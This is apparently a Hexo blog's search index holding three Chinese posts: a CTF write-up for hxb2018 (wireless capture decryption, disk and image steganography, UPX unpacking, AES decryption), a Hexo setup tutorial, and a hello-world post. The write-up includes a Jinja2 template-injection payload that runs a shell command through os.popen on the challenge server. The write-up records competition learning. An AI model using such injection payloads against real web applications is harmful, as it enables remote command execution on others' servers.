<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[hxb2018部分writeup]]></title>
    <url>%2F2018%2F11%2F23%2Fhxb2018%E9%83%A8%E5%88%86writeup%2F</url>
    <content type="text"><![CDATA[MiscFlow 流量取证，这个流量包中隐藏着一些秘密，你能找出来吗？ 拿到一个pacp流量包打开,发现全是802.11协议的,是WALN无线报文，并且经过加密，先解密 上kali用aircrack-ng直接跑 之前师兄的几个字典都不行，后来发现kali自带的很不错 wireshark导入密钥 导入后发现内容多了许多,字符串搜索flag Disk 磁盘隐写，这个磁盘上隐藏着一些秘密，你能找出来吗？ 题目给了一个-flat.vmdk文件,-flat.vmdk文件,-flat.vmdk文件(坑死了，简单的题目复杂化~) 本菜鸟本着面向搜索引擎做题的方法，看到了这个重建虚拟机丢失的虚拟磁盘vmdk，然后各种配置esxi环境失败,到后面也没连上去哈哈 正常操作一下，发现360压缩能打开（其它压缩软件貌似打不开的，360NB；后来发现360压缩可以看到NTFS交换数据流隐写的,如下面的ADS） flag0-3.txt都发现flag is not here;are you kidding? 然后看到flag0-3.txt:ads,打开发现是不可打印字符 用winhex打开发现一串二进制数，把4个文件的二进制数连起来转为ascii即可 还是太菜了，自从护网杯那道内存取证，一直对取证题敬畏，谁会想到这道题这么简单~ Hidden Write 没有套路，很常规的隐写，注意看图片末尾 题目给了一张龙猫的图片，放进winhex看一下 发现3个IHDR和IEND，理论存在3张图片，但binwalk只能得到原图一张，发现后两张少了PNG头，补上89504E470D0A1A0A 成功binwalk出3张图片 在分离出的第二张图片LSB发现一部分flag 第一和第三张是盲水印(字节小是原图，大有水印) 盲水印脚本 在最原始原图未发现最后一部分flag WebXmeO 注册账号，模板注入 1&#123;&#123;''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('grep -r -n "hxb" /home').read()&#125;&#125; show得到flag,或者登陆账号admin密码admin,发现里面有大佬遗留下来的做题痕迹，直接show拿走flag23333 ReverseReplace 有壳，kali下upx -d去壳 将数据提取出来，附上大佬脚本 CryptoCommon Crypto 密码学是个exe？不高兴又是Re ida打开程序大概知道是AES加密，从==sub_140001000== 中也可以看到一些赋值，估计是密钥 对于密文，前半部分是AES加密，后半部分则是decode(‘hex’) 脚本附上1234567from Crypto.Cipher import AESkey = '\x1b\x2e\x35\x46\x58\x6e\x72\x86\x9b\xa7\xb5\xc8\xd9\xef\xff\x0c'text='8aeb45c62003ba52e46c9600b3699b8c30386334623434393136633963356136'ciphertext = text.decode('hex')decodesys = AES.new(key)print decodesys.decrypt(ciphertext)[:16] + ciphertext[-16:] + '&#125;'#hxb2018&#123;d9e801ec08c4b44916c9c5a6&#125; 大佬的详细WP 总结还是太菜了，比赛期间本菜鸡都依靠强大的队友瑟瑟发抖的划水，别的大佬都在日主办方服务器~]]></content>
  </entry>
  <entry>
    <title><![CDATA[用hexo搭建本地博客]]></title>
    <url>%2F2018%2F11%2F11%2F%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[为什么搭博客？还不是因为无聊，学习是不可能的，这辈子都不可能学习；打LOL又嫌舍友太菜。开个玩笑，搭建自己的博客主要还是因为记录下自己的学习成长过程嘛，队里的大佬都有自己的Blog，自己也不好意思落下，有空的上传下自己的做题的writeup或复现还是不错的。 什么是Hexo？我不知道，网上教程多 Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。 前提环境 node.js Git ps:我是在Windows下做的，linux用户只需(git自带) 12sudo apt-get install nodejssudo apt-get install npm 出现以下情况则安装成功 然后你就可以快乐地在一个新文件夹里右键Git Bash Here $ npm install -g hexo-cli 成功如下 建站 在想要建站的文件夹中(必须是空文件夹)输入如下 hexo init #初始化该文件夹,需要点时间 在文件夹发现多了些文件目录如下 12345678.├── _config.yml├── package.json├── scaffolds├── source| ├── _drafts| └── _posts└── themes _config.yml是网站配置信息详情 继续刚才的文件夹输入如下安装组件 npm install 生成静态文件和启动服务器12hexo ghexo s 浏览器输入http://localhost:4000/出现如下，恭喜博客初步建成 下面介绍一些常用hexo命令new $ hexo new [layout] 新建一篇文章。如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。如果标题包含空格的话，请使用引号括起来。 generate $ hexo generate 生成静态文件,等价于hexo g server $ hexo server 启动服务器等价于hexo s。默认情况下，访问网址为： http://localhost:4000/。 clean $ hexo clean 清除缓存文件 (db.json) 和已生成的静态文件 (public)。 在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。 deploy hexo deploy 部署网站。等价于hexo d ps:用这个命令要先安装扩展 npm install hexo-deployer-git –save 部署到网站的一般流程123hexo cleanhexo ghexo d 不过此前一般在本地测试12hexo ghexo s]]></content>
  </entry>
  <entry>
    <title><![CDATA[MyFirst]]></title>
    <url>%2F2018%2F11%2F07%2FMyFirst%2F</url>
    <content type="text"><![CDATA[第一篇博客 Hello World！]]></content>
  </entry>
</search>
